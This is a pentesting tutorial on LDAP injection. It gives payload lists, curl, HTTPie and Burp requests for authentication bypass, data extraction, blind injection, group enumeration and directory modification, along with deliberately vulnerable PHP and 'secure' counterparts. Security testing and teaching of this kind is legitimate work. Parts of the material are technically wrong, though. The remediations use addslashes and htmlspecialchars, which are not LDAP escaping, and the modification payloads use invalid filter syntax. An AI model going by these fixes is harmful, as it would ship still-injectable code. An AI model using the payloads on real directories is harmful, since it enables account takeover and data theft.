# Testing for LDAP Injection Vulnerabilities

## Overview

Testing for LDAP Injection vulnerabilities involves verifying that a web application properly sanitizes user input used in LDAP (Lightweight Directory Access Protocol) queries to prevent attackers from manipulating directory services or extracting sensitive data. According to OWASP (WSTG-INPV-006), LDAP Injection occurs when untrusted input is incorporated into LDAP queries without validation, enabling attackers to bypass authentication, extract user data, or modify directory entries. This guide provides a hands-on methodology to test for LDAP Injection vulnerabilities, focusing on input vectors, authentication injection, data extraction, blind LDAP injection, filter bypass, group membership enumeration, and LDAP modification injection, with tools, commands, payloads, and remediation strategies.

**Impact**: LDAP Injection vulnerabilities can lead to:
- Unauthorized access to user accounts or directory data.
- Exposure of sensitive information (e.g., usernames, passwords, group memberships).
- Modification of directory entries (e.g., changing user attributes).
- Application logic bypass or privilege escalation.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

**Ethical Note**: Obtain explicit permission before testing, as LDAP injection attempts may access sensitive directory data or disrupt directory services.

## Testing Tools

The following tools are recommended for testing LDAP Injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject LDAP payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify input vectors.
  - **Note**: Check responses for LDAP errors or unexpected data.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with custom injection rules; manually verify findings due to limited LDAP support.

- **cURL and HTTPie**: Send HTTP requests with LDAP payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/login?user=admin)(uid=*"
      # HTTPie
      http "http://example.com/login?user==admin)(uid=*"
      ```

- **ldapsearch**: Command-line tool to test LDAP queries directly.
  - Install on Linux:
    ```bash
    sudo apt install ldap-utils
    ```
  - Install on Windows/Mac: Download from [OpenLDAP](https://www.openldap.org/).
  - Example:
    ```bash
    ldapsearch -x -h ldap.example.com -b "dc=example,dc=com" "(uid=admin)(uid=*)"
    ```

- **Postman**: GUI tool for testing LDAP injection in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters or body.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to LDAP payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Elements tab for error messages.
  - **Note**: Firefox’s 2025 LDAP query inspection enhancements improve debugging.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-006, testing LDAP Injection vulnerabilities across input vectors, authentication injection, data extraction, blind LDAP injection, filter bypass, group membership enumeration, and LDAP modification injection.

### Common LDAP Injection Payloads

Below is a list of common LDAP Injection payloads to test various LDAP query vulnerabilities. Start with simple payloads and escalate based on responses. Use with caution in controlled environments to avoid unintended data exposure.

- **Basic Injection Payloads**:
  - `*)(uid=*` (Bypasses authentication by matching all users)
  - `admin)(uid=*` (Appends wildcard filter)
  - `*` (Matches all entries)
  - `)(objectClass=*` (Bypasses filters)

- **Authentication Bypass Payloads**:
  - `admin)(&(uid=*))` (Bypasses login)
  - `*)(|(uid=admin))` (OR condition bypass)
  - `admin*` (Wildcard username match)

- **Data Extraction Payloads**:
  - `*)(cn=*` (Extracts common names)
  - `*)(mail=*` (Extracts email addresses)
  - `*)(objectClass=user` (Extracts user objects)

- **Blind Injection Payloads**:
  - `admin)(&(uid=admin)(objectClass=*))` (True condition)
  - `admin)(&(uid=admin)(objectClass=invalid))` (False condition)
  - `admin)(&(uid=a*))` (Tests first character)

- **Filter Bypass Payloads**:
  - `%2a)(uid=%2a` (URL-encoded wildcard)
  - `admin%29%28uid%3d%2a` (Encoded bypass)
  - `*)(|(cn=admin)(cn=user))` (OR condition)

- **Group Membership Enumeration Payloads**:
  - `*)(memberOf=cn=admins,dc=example,dc=com` (Extracts admin group members)
  - `*)(memberOf=*` (Extracts all group memberships)
  - `*)(isMemberOf=cn=users,dc=example,dc=com` (Alternative attribute)

- **LDAP Modification Payloads**:
  - `*)(userPassword=*` (Attempts password extraction)
  - `*)(&(uid=admin)(replace: userPassword=newpass))` (Attempts password change)
  - `*)(add: memberUid=attacker)` (Attempts group membership addition)

**Note**: Payloads depend on the LDAP schema (e.g., Active Directory, OpenLDAP) and query structure. Test payloads in query parameters, form fields, or headers where LDAP queries are likely used.

### 1. Identify Input Vectors

**Objective**: Locate user-controllable inputs that may be used in LDAP queries.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify login forms, search fields, or APIs that may query LDAP directories.
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or click links to capture requests in HTTP History.
   - Note parameters (e.g., `user=admin`, `query=john`).
3. Inspect responses:
   - Check for LDAP-related errors (e.g., `Invalid DN syntax`) or directory data.
   - Use Developer Tools (`Ctrl+Shift+I`) to search for LDAP attributes in output.
4. List input vectors:
   - Document query parameters, form fields, headers, and JSON payloads.

**Example Input Vectors**:
- URL: `http://example.com/login?user=admin`
- Form: `<input name="username">`
- API: `POST /api` with `{"user": "admin"}`

**Remediation**:
- Validate inputs with allowlists:
  ```php
  if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['user'])) die("Invalid input");
  ```
- Escape special characters:
  ```php
  $user = addslashes($_GET['user']);
  ```

**Tip**: Save the input vector list in a report.

### 2. Test for LDAP Authentication Injection

**Objective**: Verify if authentication forms are vulnerable to LDAP injection.

**Steps**:
1. Identify login forms:
   - Look for username/password fields or SSO endpoints.
2. Inject payloads:
   - Use Burp Repeater:
     ```http
     POST /login HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     username=admin)(uid=*&password=test
     ```
   - Use HTTPie:
     ```bash
     http POST http://example.com/login username="admin)(uid=*" password=test
     ```
3. Check responses:
   - Look for successful login or LDAP errors (e.g., `Invalid credentials`).
   - Test: `*)(|(uid=admin))`.
4. Use ldapsearch to simulate:
   ```bash
   ldapsearch -x -h ldap.example.com -b "dc=example,dc=com" "(uid=admin)(uid=*)"
   ```

**Example Vulnerable Code (PHP)**:
```php
$ldap = ldap_connect("ldap://ldap.example.com");
$filter = "(uid=$username)";
ldap_search($ldap, "dc=example,dc=com", $filter);
```
Test: `username=admin)(uid=*`
Result: Logs in without valid credentials.

**Example Secure Code (PHP)**:
```php
$username = preg_replace('/[^a-zA-Z0-9]/', '', $username);
$ldap = ldap_connect("ldap://ldap.example.com");
$filter = "(uid=$username)";
ldap_search($ldap, "dc=example,dc=com", $filter);
```
Test: No login.

**Remediation**:
- Sanitize inputs:
  ```php
  $username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
  ```
- Use parameterized LDAP queries (if supported) or strict validation.

**Tip**: Save authentication bypass evidence in a report.

### 3. Test for LDAP Data Extraction

**Objective**: Attempt to extract directory data via LDAP injection.

**Steps**:
1. Identify data display endpoints:
   - Look for search results, user profiles, or API responses.
2. Inject payloads:
   - Use Burp:
     ```http
     GET /search?query=john)(cn=* HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/search?query=john)(cn=*"
     ```
3. Check responses:
   - Look for additional data (e.g., user names, emails).
   - Test: `*)(mail=*`.
4. Use ldapsearch to confirm:
   ```bash
   ldapsearch -x -h ldap.example.com -b "dc=example,dc=com" "(cn=*)"
   ```

**Example Vulnerable Code (PHP)**:
```php
$filter = "(cn=$query)";
ldap_search($ldap, "dc=example,dc=com", $filter);
```
Test: `?query=john)(cn=*`
Result: Returns all common names.

**Example Secure Code (PHP)**:
```php
$query = preg_replace('/[^a-zA-Z0-9]/', '', $query);
$filter = "(cn=$query)";
ldap_search($ldap, "dc=example,dc=com", $filter);
```
Test: No extra data.

**Remediation**:
- Restrict LDAP queries:
  ```php
  $filter = "(cn=" . addslashes($query) . ")";
  ```
- Limit returned attributes:
  ```php
  ldap_search($ldap, "dc=example,dc=com", $filter, ["cn"]);
  ```

**Tip**: Save extracted data in a report.

### 4. Test for Blind LDAP Injection

**Objective**: Detect LDAP injection when no data is returned.

**Steps**:
1. Inject Boolean payloads:
   - Test true condition: `?query=admin)(&(uid=admin)(objectClass=*))`
   - Test false condition: `?query=admin)(&(uid=admin)(objectClass=invalid))`
   - Use Burp:
     ```http
     GET /search?query=admin)(&(uid=admin)(objectClass=*)) HTTP/1.1
     Host: example.com
     ```
2. Compare responses:
   - Look for differences in content, status codes, or behavior.
3. Extract data incrementally:
   - Test: `admin)(&(uid=a*))`.
4. Automate with Burp Intruder:
   - Use payloads to brute-force characters.
5. Use ldapsearch to simulate:
   ```bash
   ldapsearch -x -h ldap.example.com -b "dc=example,dc=com" "(uid=admin)(objectClass=*)"
   ```

**Example Vulnerable Code (PHP)**:
```php
$filter = "(uid=$query)";
$result = ldap_search($ldap, "dc=example,dc=com", $filter);
if (ldap_count_entries($ldap, $result) > 0) {
    echo "Found";
} else {
    echo "Not found";
}
```
Test: `?query=admin)(&(uid=admin)(objectClass=*))` vs. `?query=admin)(&(uid=admin)(objectClass=invalid))`
Result: Different responses.

**Example Secure Code (PHP)**:
```php
$query = preg_replace('/[^a-zA-Z0-9]/', '', $query);
$filter = "(uid=$query)";
$result = ldap_search($ldap, "dc=example,dc=com", $filter);
```
Result: No difference.

**Remediation**:
- Sanitize inputs:
  ```php
  $query = str_replace(")", "", $query);
  ```
- Disable verbose error messages:
  ```php
  ldap_set_option($ldap, LDAP_OPT_ERROR_STRING, "");
  ```

**Tip**: Save response differences in a report.

### 5. Test for LDAP Filter Bypass

**Objective**: Verify if LDAP query filters can be bypassed.

**Steps**:
1. Inject bypass payloads:
   - Test: `?query=admin)(|(cn=admin)(cn=user))`
   - Use cURL:
     ```bash
     curl -i "http://example.com/search?query=admin)(|(cn=admin)(cn=user))"
     ```
2. Check responses:
   - Look for unauthorized data or query success.
3. Test encoded payloads:
   - Try: `?query=%2a)(uid=%2a`.
4. Test OR conditions:
   - Try: `*)(|(uid=admin))`.
5. Use ldapsearch to confirm:
   ```bash
   ldapsearch -x -h ldap.example.com -b "dc=example,dc=com" "(|(cn=admin)(cn=user))"
   ```

**Example Vulnerable Code (PHP)**:
```php
$filter = "(cn=$query)";
ldap_search($ldap, "dc=example,dc=com", $filter);
```
Test: `?query=admin)(|(cn=admin)(cn=user))`
Result: Accesses unauthorized data.

**Example Secure Code (PHP)**:
```php
$query = preg_replace('/[^a-zA-Z0-9]/', '', $query);
if (empty($query)) die("Invalid input");
$filter = "(cn=$query)";
ldap_search($ldap, "dc=example,dc=com", $filter);
```
Test: No access.

**Remediation**:
- Reject special characters:
  ```php
  if (preg_match('/[*\(\)|]/', $query)) die("Invalid input");
  ```
- Use strict query templates:
  ```php
  $filter = "(cn={$clean_query})";
  ```

**Tip**: Save bypass payloads and responses in a report.

### 6. Test for Group Membership Enumeration

**Objective**: Check if LDAP injection can extract group membership information.

**Steps**:
1. Identify inputs used in LDAP queries (e.g., search or profile endpoints).
2. Inject group membership payloads:
   - Use Burp:
     ```http
     GET /search?query=*)(memberOf=cn=admins,dc=example,dc=com HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/search?query=*)(memberOf=cn=admins,dc=example,dc=com"
     ```
3. Check responses:
   - Look for group members (e.g., admin users) or LDAP attributes.
   - Test: `*)(memberOf=*` to list all memberships.
4. Use ldapsearch to simulate:
   ```bash
   ldapsearch -x -h ldap.example.com -b "dc=example,dc=com" "(memberOf=cn=admins,dc=example,dc=com)" cn
   ```

**Example Vulnerable Code (PHP)**:
```php
$filter = "(uid=$query)";
ldap_search($ldap, "dc=example,dc=com", $filter);
```
Test: `?query=*)(memberOf=cn=admins,dc=example,dc=com`
Result: Returns admin group members.

**Example Secure Code (PHP)**:
```php
$query = preg_replace('/[^a-zA-Z0-9]/', '', $query);
$filter = "(uid=$query)";
ldap_search($ldap, "dc=example,dc=com", $filter, ["uid"]);
```
Test: No group data.

**Remediation**:
- Restrict attribute access:
  ```php
  ldap_search($ldap, "dc=example,dc=com", $filter, ["uid", "cn"]);
  ```
- Deny group queries:
  ```php
  if (strpos($filter, 'memberOf') !== false) die("Invalid query");
  ```

**Tip**: Save group membership data in a report.

### 7. Test for LDAP Modification Injection

**Objective**: Verify if LDAP injection can modify directory entries (e.g., user attributes).

**Steps**:
1. Identify inputs that may trigger LDAP write operations (e.g., profile update forms).
2. Inject modification payloads:
   - Use Burp:
     ```http
     POST /update HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     user=admin)(&(uid=admin)(replace: userPassword=newpass))
     ```
   - Use HTTPie:
     ```bash
     http POST http://example.com/update user="admin)(&(uid=admin)(replace: userPassword=newpass))"
     ```
3. Check responses:
   - Look for success messages or attribute changes.
   - Test: `*)(add: memberUid=attacker)` to add group membership.
4. Verify changes:
   - Attempt login with modified credentials or check group membership.
5. Use ldapsearch to confirm schema:
   ```bash
   ldapsearch -x -h ldap.example.com -b "dc=example,dc=com" "(uid=admin)" userPassword
   ```

**Example Vulnerable Code (PHP)**:
```php
$filter = "(uid=$user)";
$entry = ["userPassword" => $_POST["newpass"]];
ldap_modify($ldap, "uid=$user,dc=example,dc=com", $entry);
```
Test: `user=admin)(&(uid=admin)(replace: userPassword=newpass))`
Result: Changes admin password.

**Example Secure Code (PHP)**:
```php
$user = preg_replace('/[^a-zA-Z0-9]/', '', $user);
if (!ldap_bind($ldap, "uid=$user,dc=example,dc=com", $password)) die("Auth failed");
$entry = ["userPassword" => $_POST["newpass"]];
ldap_modify($ldap, "uid=$user,dc=example,dc=com", $entry);
```
Test: No modification.

**Remediation**:
- Require authentication for modifications:
  ```php
  ldap_bind($ldap, "cn=admin,dc=example,dc=com", $admin_pass);
  ```
- Validate inputs strictly:
  ```php
  if (preg_match('/[()\[\]]/', $user)) die("Invalid input");
  ```

**Tip**: Save evidence of modified attributes in a report.
